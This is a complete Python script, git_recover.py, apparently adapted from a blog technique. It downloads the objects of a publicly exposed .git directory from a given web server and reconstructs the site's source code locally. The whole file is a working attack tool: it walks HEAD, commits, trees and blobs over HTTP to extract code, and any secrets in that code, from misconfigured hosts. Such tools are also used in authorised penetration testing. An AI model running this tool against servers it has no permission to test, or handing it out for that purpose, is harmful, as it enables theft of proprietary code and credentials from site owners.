#!/bin/python3

'''
This is an implementation of the technique described in https://medium.com/swlh/hacking-git-directories-e0e60fa79a36
'''

import argparse
import requests
import os
import sys
import subprocess

parser = argparse.ArgumentParser(
                    prog='git_recover.py',
                    description='Recovers a git repository from a publicly exposed .git directory.',
                    epilog='Example: git_recover.py http://127.0.0.1/.git/ target_dir')

parser.add_argument('-u', '--url', required=True, help='The URL to recover from, including the .git directory, if applicable.')
parser.add_argument('-t', '--target', required=True, help='The target directory to recover to. A .dit directory will be createdd automatically, if needed.')
parser.add_argument('-f', '--force', action='store_true', help='Overwrite non-empty directories.')

args = parser.parse_args()

url = args.url
root = args.target
gitroot = os.path.join(root, '.git')

os.makedirs(root, exist_ok=True)

if not args.force:
     
    for sub in os.listdir(root):
        if sub!='.git':
            print("[-] Target directory is not empty. Set -f to overwrite.", file=sys.stderr)
            exit(1)


os.makedirs(gitroot, exist_ok=True)

if len(os.listdir(gitroot)) > 0 and not args.force:
        print("[-] Target git directory is not empty. Set -f to overwrite.", file=sys.stderr)
        exit(2)

if not url.endswith("/"):
    url+='/'

def write_file(relative_path, content):

    path = os.path.join(gitroot, relative_path)
    os.makedirs(os.path.dirname(path), exist_ok=True)    
    with open(path, 'wb') as f: 
        f.write(content)
        f.close()

def fetch_file(relative_path, allow_fail, endl = '\n'):

    print('[*] Fetching ' + relative_path, end=endl)

    r = requests.get(url+relative_path)
    if not r.status_code==200:
        if allow_fail:
            return None
        else:
            print("[-] Unable to fetch " + relative_path, file=sys.stderr)
            exit(100)

    write_file(relative_path, r.content)
    return r.content

def fetch_tree(relative_path, sha):

    obj_path = 'objects/'+sha[0:2]+'/'+sha[2:]

    if fetch_file(obj_path, True, ' -> ') == None:
        print('WARNING: Unable to fetch ' + relative_path)
        return
    
    p = subprocess.run(['git', 'cat-file', '-t', sha], cwd=root, stdout=subprocess.PIPE)
    type = p.stdout.decode().strip()
    print(f'{type} {relative_path}')

    p = subprocess.run(['git', 'cat-file', '-p', sha], cwd=root, stdout=subprocess.PIPE)
    content = p.stdout

    if type!='blob':
        lines = content.decode().strip().split('\n')

    match type:

        case 'commit':

            print('[+] Commit info:')
            tree=''

            for line in lines:
                print('[*] ' + line)
                if line.startswith('tree'):
                    tree = line[5:]
            
            if len(tree)==40:
                fetch_tree(relative_path, tree)
            else:
                print("[-] Unable to fetch commit tree" + relative_path, file=sys.stderr)
                exit(200)

        case 'tree':

            for line in lines:
                spl = line.split('\t')
                info = spl[0].split(' ')
                filename = spl[1]
                fetch_tree(os.path.join(relative_path,filename),info[2])

        case 'blob':

            os.makedirs(os.path.dirname(relative_path), exist_ok=True)    
            with open(relative_path, 'wb') as f: 
                f.write(content)
                f.close()

        case _:

            print('Unknown type')
            print(lines)
            exit()

head = fetch_file('HEAD', False).decode().strip().replace('ref: ','')
head_sha = fetch_file(head, False).decode().strip()
fetch_tree(root, head_sha)
